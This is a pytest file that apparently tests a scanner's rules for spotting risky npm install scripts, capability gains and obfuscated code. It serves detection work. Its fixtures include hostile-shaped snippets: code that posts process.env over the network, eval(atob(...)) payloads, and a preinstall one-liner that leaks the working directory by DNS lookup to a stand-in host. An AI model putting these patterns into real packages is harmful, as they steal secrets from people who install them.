"""Stage 3 rules on hand-written profiles built from inert snippets."""

import json

from kitsunox.core.models import PackageVersionRef, PublishInfo, Severity, VersionSnapshot
from kitsunox.ecosystems.npm.install import install_sources
from kitsunox.ecosystems.npm.rules import install_code
from kitsunox.ecosystems.npm.rules.install_code import (
    InstallScriptChanged,
    InstallScriptCode,
    InstallScriptObfuscated,
)
from kitsunox.rules.capabilities import CapabilityGained
from kitsunox.stages.ast import CapabilityCache, CodeChange, code_change

CACHE = CapabilityCache(None)
SNAP = VersionSnapshot(
    ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.1"),
    publish=PublishInfo(),
    manifest={},
)
PLAIN = {"index.js": b'const fs = require("fs")'}


def pkg(hook: str | None = None, files: dict[str, bytes] | None = None) -> dict[str, bytes]:
    tree = dict(PLAIN) | (files or {})
    if hook is not None:
        tree["package.json"] = json.dumps({"scripts": {"postinstall": hook}}).encode()
    return tree


def change(new: dict[str, bytes], base: dict[str, bytes] | None) -> CodeChange:
    return code_change(SNAP, new, base, CACHE, install_sources, "1.0.0")


def test_gaining_network_with_env_is_medium() -> None:
    new = pkg(files={"lib/x.js": b"fetch(u, {body: JSON.stringify(process.env)})"})
    (finding,) = CapabilityGained().evaluate_code(change(new, PLAIN))
    assert finding.severity is Severity.MEDIUM
    assert "env-all, network" in finding.explanation
    assert {e.path for e in finding.evidence} == {"lib/x.js"}


def test_after_an_empty_placeholder_only_eval_stays_medium() -> None:
    """A first real release after `0.0.0-placeholder` gains everything; `eval` still counts
    (`autotel-*`, `awaitly-*` injected it after an empty first version)."""
    empty = {"index.js": b"module.exports = {}"}
    app = pkg(files={"lib/x.js": b"fetch(u, {body: JSON.stringify(process.env)})"})
    (finding,) = CapabilityGained().evaluate_code(change(app, empty))
    assert finding.severity is Severity.LOW
    payload = pkg(files={"lib/x.js": b"eval(atob(s))"})
    (finding,) = CapabilityGained().evaluate_code(change(payload, empty))
    assert finding.severity is Severity.MEDIUM


def test_gaining_the_environment_without_network_is_low() -> None:
    """v2: apps that start reading `process.env` were the commonest MEDIUM-only report."""
    env = pkg(files={"lib/x.js": b"const v = process.env"})
    (finding,) = CapabilityGained().evaluate_code(change(env, PLAIN))
    assert finding.severity is Severity.LOW
    dynamic = pkg(files={"lib/x.js": b"eval(atob(x))"})
    (finding,) = CapabilityGained().evaluate_code(change(dynamic, PLAIN))
    assert finding.severity is Severity.MEDIUM


def test_gaining_dynamic_code_alone_is_medium_only_through_eval() -> None:
    """v3: `new Function(body)` and `vm` alone were 85 of 90 live reports this rule made alone
    through `dynamic-code`; the malicious ones were injected `eval(` payloads."""
    rule = CapabilityGained()
    for code in (b"new Function(body)", b'import vm from "node:vm"', b"Function(a, b)"):
        (finding,) = rule.evaluate_code(change(pkg(files={"lib/x.js": code}), PLAIN))
        assert finding.severity is Severity.LOW, code
    for code in (b"eval(payload)", b'globalThis["eval"](payload)', b"new Function(x); eval(y)"):
        (finding,) = rule.evaluate_code(change(pkg(files={"lib/x.js": code}), PLAIN))
        assert finding.severity is Severity.MEDIUM, code
    # `eval` is shown first, ahead of the `Function` calls before it.
    many = b"new Function(a); new Function(b); new Function(c);\neval(y)"
    (finding,) = rule.evaluate_code(change(pkg(files={"lib/x.js": many}), PLAIN))
    assert finding.severity is Severity.MEDIUM
    assert (finding.evidence[0].snippet or "").startswith("[dynamic-code] eval(y)")
    # With network, `Function` stays MEDIUM; `eval` the base already had is not gained.
    (finding,) = rule.evaluate_code(
        change(pkg(files={"lib/x.js": b"fetch(u); Function(b)"}), PLAIN)
    )
    assert finding.severity is Severity.MEDIUM
    had = pkg(files={"lib/y.js": b"eval(z)"})
    assert rule.evaluate_code(change(pkg(files={"lib/y.js": b"eval(z); Function(b)"}), had)) == ()


def test_gaining_only_network_is_low_and_nothing_for_new_packages() -> None:
    new = pkg(files={"lib/x.js": b"fetch(u)"})
    (finding,) = CapabilityGained().evaluate_code(change(new, PLAIN))
    assert finding.severity is Severity.LOW
    assert CapabilityGained().evaluate_code(change(new, None)) == ()  # new package
    assert CapabilityGained().evaluate_code(change(PLAIN, PLAIN)) == ()


def test_install_script_code_for_new_packages() -> None:
    new = pkg("node setup.js", {"setup.js": b'require("child_process").exec(x)'})
    (finding,) = InstallScriptCode().evaluate_code(change(new, None))
    assert finding.severity is Severity.MEDIUM
    assert "runs setup.js, which uses process." in finding.explanation


def test_install_script_code_counts_only_new_capabilities_on_updates() -> None:
    old = {"setup.js": b'require("https").get(u)'} | pkg("node setup.js")
    same = {"setup.js": b'require("https").get(v)'} | pkg("node setup.js")
    worse = {"setup.js": b'require("https").get(u); eval(x)'} | pkg("node setup.js")
    assert InstallScriptCode().evaluate_code(change(same, old)) == ()
    (finding,) = InstallScriptCode().evaluate_code(change(worse, old))
    assert "dynamic-code (new to the install code)" in finding.explanation
    assert InstallScriptCode().evaluate_code(change(PLAIN, None)) == ()  # no install script


def test_a_changed_install_file_is_shown_as_a_diff() -> None:
    """The hook's command is word for word the same; the file it runs isn't."""
    old = pkg("node setup.js", {"setup.js": b"console.log('hi')\nconst a = 1\n"})
    new = pkg("node setup.js", {"setup.js": b"console.log('hi')\nconst a = 2\nfetch(u)\n"})
    (finding,) = InstallScriptChanged().evaluate_code(change(new, old))
    assert finding.severity is Severity.MEDIUM
    assert finding.explanation == (
        "`npm install` runs code that changed since 1.0.0: setup.js (+2 -1 lines)."
    )
    (evidence,) = finding.evidence
    assert (evidence.path, evidence.line_start) == ("setup.js", 1)
    assert evidence.snippet is not None
    assert evidence.snippet.splitlines() == [
        "@@ -1,2 +1,3 @@",
        " console.log('hi')",
        "-const a = 1",
        "+const a = 2",
        "+fetch(u)",
    ]
    rule = InstallScriptChanged()
    assert rule.evaluate_code(change(old, old)) == ()  # unchanged
    assert rule.evaluate_code(change(new, None)) == ()  # new package: nothing to compare
    assert rule.evaluate_code(change(PLAIN, PLAIN)) == ()  # no install script


def test_a_newly_run_binary_or_long_install_file() -> None:
    rule = InstallScriptChanged()
    old = pkg("node a.js", {"a.js": b"1"})
    (newly,) = rule.evaluate_code(change(pkg("node b.js", {"b.js": b"2"}), old))
    assert "b.js (newly run)" in newly.explanation
    assert newly.evidence[0].snippet == "@@ -0,0 +1 @@\n+2"
    binary = pkg("node a.js", {"a.js": b"\x00\x01"})
    (found,) = rule.evaluate_code(change(binary, old))
    assert found.evidence[0].snippet == "(binary file changed)"
    long_old = pkg("node a.js", {"a.js": b"x\n" * (install_code.MAX_DIFFED_LINES + 1)})
    (found,) = rule.evaluate_code(change(long_old, old))
    assert "a.js (too long to diff)" in found.explanation
    assert "too long to diff" in (found.evidence[0].snippet or "")


def test_a_long_diff_is_cut() -> None:
    old = pkg("node a.js", {"a.js": b"".join(b"%d\n" % i for i in range(100))})
    new = pkg("node a.js", {"a.js": b"".join(b"%d!\n" % i for i in range(100))})
    (found,) = InstallScriptChanged().evaluate_code(change(new, old))
    lines = (found.evidence[0].snippet or "").splitlines()
    assert len(lines) == install_code.MAX_DIFF_LINES + 1
    assert lines[-1].startswith("... ") and lines[-1].endswith(" more diff lines")


def test_an_install_file_that_changed_only_its_own_version_is_unchanged() -> None:
    old = pkg("node i.js", {"i.js": b"download(`kx@1.0.0`)"})
    new = pkg("node i.js", {"i.js": b"download(`kx@1.0.1`)"})
    assert InstallScriptChanged().evaluate_code(change(new, old)) == ()  # SNAP is 1.0.1
    other = pkg("node i.js", {"i.js": b"download(`evil@1.0.1`)"})
    assert len(InstallScriptChanged().evaluate_code(change(other, old))) == 1


def test_an_install_file_that_changed_only_its_line_endings_is_unchanged() -> None:
    """`@tera-system/pro` 0.2.33: `install.js` went from CRLF to LF, reported +0 -0 lines."""
    old = pkg("node i.js", {"i.js": b"const a = 1;\r\nrun(a);\r\n"})
    new = pkg("node i.js", {"i.js": b"const a = 1;\nrun(a);\n"})
    assert InstallScriptChanged().evaluate_code(change(new, old)) == ()
    edited = pkg("node i.js", {"i.js": b"const a = 2;\nrun(a);\n"})
    (found,) = InstallScriptChanged().evaluate_code(change(edited, old))
    assert "i.js (+1 -1 lines)" in found.explanation


def test_a_loaded_install_file_counts_only_when_it_adds_a_risky_use() -> None:
    """`openyida`: the hook's script imports the library, whose ordinary changes aren't news.
    A loaded file's change counts when it adds a network, process, environment or eval use."""
    hook = {"setup.js": b'require("./lib/util")\n'}
    old = pkg("node setup.js", hook | {"lib/util.js": b'const https = require("https")\nf(1)\n'})
    edited = pkg("node setup.js", hook | {"lib/util.js": b'const https = require("https")\nf(2)\n'})
    assert InstallScriptChanged().evaluate_code(change(edited, old)) == ()
    worse = pkg(
        "node setup.js",
        hook | {"lib/util.js": b'const https = require("https")\nrequire("child_process")\n'},
    )
    (found,) = InstallScriptChanged().evaluate_code(change(worse, old))
    assert "lib/util.js (+1 -1 lines)" in found.explanation
    named = pkg("node setup.js", {"setup.js": b'require("./lib/util")\nf(3)\n'})
    named["lib/util.js"] = old["lib/util.js"]
    (found,) = InstallScriptChanged().evaluate_code(change(named, old))
    assert "setup.js (+1 -0 lines)" in found.explanation  # the hook's own file: any change


def test_inline_install_code_is_read() -> None:
    """`dependencykfeg`: the whole payload was a `node -e` one-liner, which named no file."""
    hook = (
        "node -e \"const dns = require('dns'); const d = Buffer.from(process.cwd())"
        ".toString('hex'); dns.lookup(d + '.x.example', () => {});\""
    )
    new = {"package.json": json.dumps({"scripts": {"preinstall": hook}}).encode()}
    (finding,) = InstallScriptCode().evaluate_code(change(new, None))
    assert "package.json#scripts.preinstall.js" in finding.explanation
    assert "network" in finding.explanation


OBFUSCATED = (";".join(f"var _0x{i:04x}=_0x{i + 1:04x}" for i in range(0x1A00, 0x1A20))).encode()


def test_obfuscated_install_code_is_high_and_new_or_changed_on_updates() -> None:
    rule = InstallScriptObfuscated()
    new = pkg("node setup.js", {"setup.js": OBFUSCATED})
    (found,) = rule.evaluate_code(change(new, None))
    assert found.severity is Severity.HIGH
    assert found.explanation.startswith("`npm install` runs obfuscated code: setup.js.")
    assert found.evidence[0].path == "setup.js"
    assert found.evidence[0].snippet is not None and "obfuscator-style" in found.evidence[0].snippet
    assert rule.evaluate_code(change(new, new)) == ()  # the same bytes ran before
    rebuilt = pkg("node setup.js", {"setup.js": OBFUSCATED + b";var _0xffff=1"})
    (changed,) = rule.evaluate_code(change(rebuilt, new))
    assert "(new or changed since the previous version)" in changed.explanation
    # Obfuscated code no hook runs is Stage 2's `static.obfuscated`, not this.
    assert rule.evaluate_code(change(pkg("node index.js", {"lib.js": OBFUSCATED}), None)) == ()
    assert rule.evaluate_code(change(pkg("node setup.js", {"setup.js": b"go()"}), None)) == ()
